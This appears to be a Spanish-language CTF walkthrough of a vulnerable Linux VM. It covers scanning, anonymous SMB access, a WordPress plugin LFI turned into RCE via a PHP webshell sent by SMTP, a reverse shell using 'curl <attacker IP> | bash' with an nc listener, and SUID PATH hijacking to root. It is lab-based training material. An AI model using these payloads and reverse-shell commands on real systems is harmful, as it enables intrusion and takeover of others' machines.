![1](https://github.com/user-attachments/assets/9bb428db-4eba-499e-bcc1-cadbab5ba53e)

## Fase de Reconocimiento

Descubrimos el host con la herramienta fping y veo que tengo conectividad con la máquina. También descubro que el TTL es 64 por lo que se trata de una máquina Linux.

![2](https://github.com/user-attachments/assets/f5222fde-be85-4755-a1d7-77d0599c198e)

`fping -a -g 192.168.51.0/24 2>/dev/null`

-a > Para mostrar únicamente las IP que están activas en la red
-g > Para especificar que vamos a hacer el ping a un rango de IP
2>/dev/null > Para enviar todas los mensajes que no nos interesan a un contenedor

Ahora descubrimos los puertos con nmap. Para ello hacemos lo siguiente:

![3](https://github.com/user-attachments/assets/4e21874d-6e63-481a-bafd-a94ee386323b)

`nmap -p- -sS --min-rate 5000 -vvv -n -Pn 192.168.51.185`

-p- > Para indicar que va a hacer un escaneo al rango total de puertos que son 65535 puertos
--open > Para indicar que muestre solo los abiertos
-sS > Para indicar que haga un escaneo SYN bastante ágil y preciso, para evitar falsos positivos
--min-rate 5000 > Para tramitar paquetes no más lentos que 5000 paquetes por segundo
-vvv > Para que a medida que vaya encontrando cosas, las vaya reportando
-n  > Para que el escaneo no haga resolución DNS y sea más rápido
-Pn > Para que tampoco haga resolución a través del protocolo ARP y no realentice el escaneo
-oN > Para guardar el reporte en un formato Normal.

| Puerto  | Servicio |
| ------- | -------- |
| 22/tcp  | SSH      |
| 25/tcp  | SMTP     |
| 80/tcp  | HTTP     |
| 139/tcp | SMB      |
| 445/tcp | SMB      |

Utilizo esta línea de comando para que me saque todos los puertos reportados por nmap en un formato limpio y útil.

![4](https://github.com/user-attachments/assets/d667d27c-2a99-4d41-af24-68a13f25b942)

Ahora vamos a lanzar unos scripts básicos de reconocimiento de nmap para averiguar la versión, Sistema Operativo y si tienen vulnerabilidades los servicios:

`nmap -p139,22,25,445,80 -sS -sV -O 192.168.51.185 -oN Target.txt`

-sV > Para averiguar la versión de cada servicio
-O > Para averiguar el Sistema Operativo que corre.

![5](https://github.com/user-attachments/assets/a734b8cb-d96b-4b44-9b18-b6c68cc2e735)

## Fase de Explotación

Vemos que hay una imagen por el puerto 80. Se podría intentar hacer esteganografía pero no va por ahí la máquina. También podemos intentar hacer Fuzzing Web pero no va por ahí tampoco.

![6](https://github.com/user-attachments/assets/5c57304f-cdfc-40cf-9808-afe6ab7b4696)

### Samba | Puerto 139

Listamos recursos compartidos con la herramienta smbmap y vemos que solo tenemos acceso de lectura al recurso anonymous por lo que podemos crear una Null session sin clave.

`smbmap -H 192.168.51.185`

![7](https://github.com/user-attachments/assets/accb0070-a36b-40e5-8c82-8952947fb8d2)

Para ello podemos utilizar tanto smbmap como smbclient. Vemos que hay un attention.txt por lo que nos los traemos a nuestra máquina local.

`smblient //192.168.51.185/anonynous -N` 
`dir`
`get attention.txt`

![8](https://github.com/user-attachments/assets/f46bf96b-f746-476b-9f9f-c3f9667a985c)

Muestra lo siguiente:

![9](https://github.com/user-attachments/assets/0cc9e7bb-d8c6-4a96-b31e-5114f71a5f45)

Nos guardamos las contraseñas para un futuro.

Como habíamos visto antes, había otro recurso compartido que era /helios, por lo que es un usuario. Entonces vamos a intentar probar con estas claves. Para ello utilizamos smbclient.

`smclient //192.168.51.185/helios -U helios
`Enter`
`qwerty`

![10](https://github.com/user-attachments/assets/2f62f20d-eff8-48df-95b1-fb00af171076)

Conseguimos entrar y vemos que hay dos archivos. Para traernos todos los archivos de una y que no nos pregunte por cada uno si queremos descargarlos escribimos el comando `prompt`. Entonces cuando hagamos un `mget *` se pasará todo automáticamente.

![11](https://github.com/user-attachments/assets/3c3d0b52-0f32-4505-b0d3-bf254486a3ee)

Vemos lo que contiene cada fichero. En el research.txt no hay nada relevante, pero en el todo.txt hay un directorio de trabajo /h3l105 . Lo que parece una ruta.

![12](https://github.com/user-attachments/assets/bc3ae76d-cb51-47d9-ada0-4d0ef213d0f0)

### Wordpress

Lo probamos en el puerto 80 y efectivamente existe.

![13](https://github.com/user-attachments/assets/44f17e2c-217b-465e-a89d-9668fb159d11)

Vemos que no resuelve pero mirando el código fuente de la página vemos un dominio, así que lo añadimos al /etc/hosts.
**symfonos.local**

![14](https://github.com/user-attachments/assets/d5d7aab1-a1c9-44dc-8d46-99521aa3770e)

Ahora vemos que resuelve y vemos que efectivamente es un WordPress. Así que lo primero que se hace siempre es  buscar el /wp-admin. Lo busco y me sale el Login. Entonces intento con el usuario admin y existe por el mensaje de error que sale.

![15](https://github.com/user-attachments/assets/e9b56fd2-684a-40a2-a43b-81311ae3fc65)

En este punto se puede intentar hacer un ataque de fuerza bruta con wpscan, que no va por ahí, o buscar vulnerabilidades, por ejemplo de plugins. Entonces usamos la herramienta wpscan.

`wpscan --url http://symfonos.local/h3l105/ -e u,p`

--url > Para indicar la ruta
-e u,p > Para enumerar usuarios y plugins

Y enumeramos estas cosas

![16](https://github.com/user-attachments/assets/e4886258-7bdc-451a-a681-a5e9185ddf3e)

### LFI to RCE

En este punto podemos utilizar Metasploit o buscar por Internet, en mi caso utilizaré searchsploit.

`searchsploit mail masta wordpress`

![17](https://github.com/user-attachments/assets/29130ead-e34d-40c3-8331-abf9bfe6030f)

Vemos que podemos hacer un LFI, así que vamos a probar a traernos el exploit y ver cómo funciona.

`searchsploit -m 40290`

![18](https://github.com/user-attachments/assets/231c39a3-7edf-440e-a92b-fbaf596a4209)

Vemos que puede mirar el /etc/passwd con esta ruta, así que vamos a probar.

![19](https://github.com/user-attachments/assets/f6d0c21d-32db-44bb-80c5-ce34be16b3ff)

Y efectivamente podemos verlo.

![20](https://github.com/user-attachments/assets/63ee860f-5d6d-4f6b-9b2f-8026dc7ec22a)

Para convertir el LFI en un RCE tenemos en esta máquina abusar del servicio SMTP / 25.

Tras investigar en esta página [Send-Email](https://www.shellhacks.com/send-email-smtp-server-command-line/) vemos que podemos enviar un email, entonces podemos intentar enviar una el comando típico de PHP para habilitar un CMD `<?php system($_GET['cmd']) ?>` y luego tras buscar la ruta exacta intentar ejecutar comandos.

Hacemos lo siguiente.

`nc 192.168.51.185 25`
`MAIL FROM: alv-fh@test.com`
`RCPT TO: helios` (Porque es un usuario que sabemos que existe)
`DATA`
`Enter`
`<?php system($_GET['cmd']) ?>`
`.`

![21](https://github.com/user-attachments/assets/118a6445-2007-40f4-ac63-633e7e60d938)

Ahora tenemos que buscar la ruta en donde se envian esos email en el sistema en Linux. 
/var/mail/helios&cmd=id

![22](https://github.com/user-attachments/assets/c7591f11-acaa-4d3d-ab37-21d75ec3e918)

Ahora podemos crear una revshell aunque también se puede desde el navegador directamente pero puede ser más lioso. Lo más sencillos es hacer lo siguiente:

1.- Desde revshell ponemos la IP atacante y el puerto, y copiamos el comando de abajo.

![23](https://github.com/user-attachments/assets/31a2deb1-a56d-41cb-8238-7831c6e49a12)

2.- Lo pegamos en un index.html.

![24](https://github.com/user-attachments/assets/38550723-e9e8-4e14-a8b7-3783f7088de8)

3.- Creamos un Servidor en Python en el mismo directorio que el index.html.

`python3 -m http.server 80`

4.- Nos ponemos en escucha a través del puerto escogido.

`nc -nlvp 443`

5.- En el navegador ponemos el comando curl:

`curl 192.168.51.179 | bash`

![25](https://github.com/user-attachments/assets/bdf7a1b8-98a6-4158-af56-ec874841a4ad)

Y le damos a Enter, si se queda cargando es buena señal.

![26](https://github.com/user-attachments/assets/06ac1b71-e567-48b0-89fe-0e2d47f107d2)

Sanitizamos la shell.

`script /dev/null -c bash`
`Ctrl + z`
`stty raw -echo; fg`
`reset xterm`
`export SHELL=bash`
`export TERM=xterm`

## Escalada de Privilegios

Y buscamos binarios que tengan permisos 4000, SUID. Vemos que hay un script raro /opt/statuscheck.

![27](https://github.com/user-attachments/assets/27fb37f7-2232-440d-bbd0-325e9b97935e)

Lo ejecutamos y a simple vista parece una petición al localhost.

![28](https://github.com/user-attachments/assets/f43bffb7-8ab4-4f62-96de-f8344fd2ea2d)

Lo listamos y efectivamente se ejecuta como root.

![30](https://github.com/user-attachments/assets/db05921f-fd01-485f-b78a-f127a4489460)

Podemos ver los strings del script para encontrar algo y vemos que se ejecuta el comando curl.

`strings /opt/statuscheck`

![29](https://github.com/user-attachments/assets/39ad5b7c-7349-45d7-9bb9-02435e2cc26f)

### Path Hijacking

Cuando nos encontramos en esta situación  podemos realizar un Path Hijacking. Los pasos a seguir son los siguientes:

1.- Cambiarnos al directorio /tmp ya que tenemos normalmente permisos de escritura.

2.- Creamos el comando curl con `nano curl` y le metemos una bash.

![31](https://github.com/user-attachments/assets/363d45d6-b1a9-400d-86d0-86e6cf2ad1b8)

-p > Inicia una bash en modo privilegiados.

3.- Le damos permisos 777.

`chmod 777 curl`

4.- Modificar el PATH poniendo un . delante o el directorio /tmp para que cuando lea el script /opt/statuscheck el PATH, a lo primero que se vaya sea al directorio de /tmp, por lo que busca ahí el comando curl, y como tenemos el comando curl pero con una bash, pues inicia automaticamente una bash como root.

`export PATH=.:$PATH`

Vemos que hay un . delante del delimitador que es :  Como se lee de izquierda a derecha, lo primero que va a leer es el . (Nuestro directorio actual de trabajo).

![32](https://github.com/user-attachments/assets/84ad0dd1-a4c2-49f8-8099-7f235aa2ea70)

5.- Ejecutar de nuevo el script /opt/statuscheck

![33](https://github.com/user-attachments/assets/7b3b7a8e-34a6-4991-97b6-342300670644)

Conseguimos ser root y encontramos la Flag.

![34](https://github.com/user-attachments/assets/7d0b357d-c29e-4f15-84f1-73fb98f10148)